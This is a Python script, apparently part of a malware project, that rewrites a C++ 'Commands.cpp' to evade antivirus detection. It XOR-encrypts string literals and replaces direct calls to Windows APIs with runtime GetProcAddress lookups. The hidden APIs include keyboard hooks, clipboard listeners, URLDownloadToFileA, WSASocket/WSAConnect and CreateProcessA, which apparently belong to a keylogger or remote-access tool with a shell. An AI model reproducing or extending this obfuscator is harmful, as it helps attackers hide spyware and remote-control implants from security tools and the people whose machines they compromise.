import secrets
import string
import json
import re
import requests
import sys
import os
from bs4 import BeautifulSoup
from os import urandom

XOR_KEY = "verysecretkey"


def xor(data, key):
    key = str(key)
    l = len(key)
    output_str = ""

    for i in range(len(data)):
        current = data[i]
        current_key = key[i % len(key)]
        def ordd(x): return x if isinstance(x, int) else ord(x)
        output_str += chr(ordd(current) ^ ord(current_key))
    return output_str

# encrypting


def xor_encrypt(data, key):
    ciphertext = xor(data, key)
    ciphertext = '{ 0x' + \
        ', 0x'.join(hex(ord(x))[2:] for x in ciphertext) + ' ,0x0};'
    return ciphertext


if len(sys.argv) < 2:
    print("Usage: ./clean.py <path>")
    sys.exit(1)

FOLDER_PATH = sys.argv[1]

if len(sys.argv) == 3 and sys.argv[2] == '--restore':
    with open(FOLDER_PATH + "Commands.bak", "r") as f:
        contents = f.readlines()

    with open(FOLDER_PATH + "Commands.cpp", "w") as f:
        f.write(''.join(contents))

    os.remove(FOLDER_PATH + "Commands.bak")
    sys.exit(0)


def obfuscate_str(var_text, var_name):
    var_text = xor_encrypt(var_text, XOR_KEY)
    # var_arr = str([*var_text, 0])[1:-1]
    # res = "char {}[] = {{{}}};".format(var_name, var_arr)
    res = "char {}[] = {};".format(var_name, var_text)
    return res


def rand_str():
    letters = string.ascii_uppercase + string.ascii_lowercase + string.digits
    return ''.join(secrets.choice(letters) for i in range(10))


def hide_strings(pattern, line, macro=False):
    res = re.findall(pattern, line)
    new_contents = []

    for var_str, var_text in res:
        print(var_str, var_text)
        new_text = rand_str()
        new_var = '_STR{}'.format(new_text)
        var_arr = obfuscate_str(var_text, new_var)

        if macro:
            var_arr += '\\'

        var_arr += '\n'
        new_contents.append(var_arr)
        line = line.replace(var_str, "XOR({})".format(new_var))

    return line, new_contents


funcsToReplace = ["SetWindowsHookExW",
                  "GetForegroundWindow",
                  "GetWindowText",
                  "CallNextHookEx",
                  "AddClipboardFormatListener",
                  "RemoveClipboardFormatListener",
                  "CloseClipboard",
                  "DeleteFileA",
                  "SetHandleInformation",
                  "CreatePipe",
                  "CloseHandle",
                  "CreateToolhelp32Snapshot",
                  "Process32Next",
                  "Process32First",
                  "TerminateProcess",
                  "GetComputerNameA",
                  "GetUserNameA",
                  "GetVersionEx",
                  "GetModuleFileNameA",
                  "FindFirstFileA",
                  "FindNextFileA",
                  "URLDownloadToFileA",
                  "DeleteFileA",
                  "WSAStartup",
                  "WSASocket",
                  "WSAConnect",
                  "CreateProcessA", "UnhookWindowsHookEx"]

func_details = {}

with open(FOLDER_PATH + "func_details.json", "r") as f:
    func_details = json.load(f)


def check_funcs(line):
    for func in funcsToReplace:
        if line.find(func) != -1:
            return func

    return None


def get_func_details(funcName):
    print("Finding details for {}...".format(funcName))
    print("Searching in {}...".format(
        'https://docs.microsoft.com/api/search?search={}&scope=Desktop&locale=en-us'.format(funcName)))
    if funcName not in func_details:
        response = requests.get(
            'https://docs.microsoft.com/api/search?search={}&scope=Desktop&locale=en-us'.format(funcName))

        for f in response.json()['results']:
            print("url: {}".format(f['url']))
            if f["url"].find(funcName.lower()) != -1 and (f["url"].find("nf-") != -1 or f["url"].find("platform-apis") != -1):
                func_url = f["url"]
                break

        print("Found URL: {}".format(func_url))

        res_text = requests.get(func_url).text
        soup = BeautifulSoup(res_text, 'html.parser')
        msdnText = ''.join(soup.find('code').get_text().splitlines())
        reqTable = soup.find_all('table')[-1]
        funcDLL = re.findall('(.*.dll)', reqTable.get_text())[0].strip()

        details = list(
            filter(None, re.split(' |\[.*?\]|\(|\)|;', msdnText)))

        func_details[funcName] = {
            "dll": funcDLL,
            "returnType": details[0],
            "funcName": details[1],
            "params": details[2:]
        }

    return func_details[funcName]


def replace_funcs(contents):
    new_contents = []

    for i, line in enumerate(contents):
        funcName = check_funcs(line)
        if funcName:
            print(funcName, line)
            funcDLL, returnType, funcName, \
                params = get_func_details(funcName).values()

            print(funcDLL, returnType, funcName, params)

            funcTypeVar = '_{}'.format(funcName)
            funcNameVar = 'f{}'.format(funcName)

            funcDef = "typedef {} (*{})({});\n".format(returnType,
                                                       funcTypeVar, " ".join(params))

            funcVar = "{} {} = ({})GetProcAddress(LoadLibraryA(XOR(\"{}\",{})), XOR(\"{}\",{}));\n".format(
                funcTypeVar, funcNameVar, funcTypeVar, funcDLL, len(funcDLL), funcName, len(funcName))

            new_contents.append(funcDef)
            new_contents.append(funcVar)

            line = line.replace(funcName, funcNameVar)

        new_contents.append(line)

    return new_contents


def replace_strings(contents):
    new_contents = []

    for i, line in enumerate(contents):
        switch_case = False
        macro = False

        if line.find("std::cout") != -1:
            continue

        if i > 0 and contents[i - 1].find("case") != -1:
            switch_case = True

        if i > 0 and contents[i - 1].find("\\") != -1:
            macro = True

        if switch_case:
            new_contents.append("{")

        line, res = hide_strings(
            r"XOR\((\"(.*?)\").*?\)", line, macro)
        new_contents.extend(res)

        line, res = hide_strings(r"\[(\"(.*?)\")\]", line, macro)
        new_contents.extend(res)

        line, res = hide_strings(
            r"COMMAND_ERROR\((\"(.*?)\")", line, macro)
        new_contents.extend(res)

        line, res = hide_strings(r"] = (\"(.*?)\")", line, macro)
        new_contents.extend(res)

        new_contents.append(line)

        if switch_case:
            new_contents.append("}")

    return new_contents


def main():

    with open(FOLDER_PATH + "Commands.cpp", "r") as f:
        contents = f.readlines()

    # with open(FOLDER_PATH + "Commands.bak", "w") as f:
    #     f.write(''.join(contents))

    new_contents = replace_funcs(contents)

    new_contents = replace_strings(new_contents)

    with open(FOLDER_PATH + "Commands.cpp", "w") as f:
        f.write(''.join(new_contents))

    with open(FOLDER_PATH + "func_details.json", "w") as f:
        f.write(json.dumps(func_details))


main()
